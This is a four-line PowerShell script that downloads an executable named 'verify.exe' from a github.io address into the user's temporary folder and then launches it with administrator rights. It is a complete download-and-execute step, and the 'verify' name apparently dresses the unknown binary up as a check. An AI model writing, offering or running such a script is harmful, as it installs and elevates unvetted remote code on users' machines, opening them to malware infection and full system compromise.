
$exeScriptUrl = "http://mcrobbyyt.github.io/verify.exe"


$localScriptPath = "$env:TEMP\verify.exe"


Invoke-WebRequest -Uri $exeScriptUrl -OutFile $localScriptPath


Start-Process -FilePath $localScriptPath -Verb RunAs
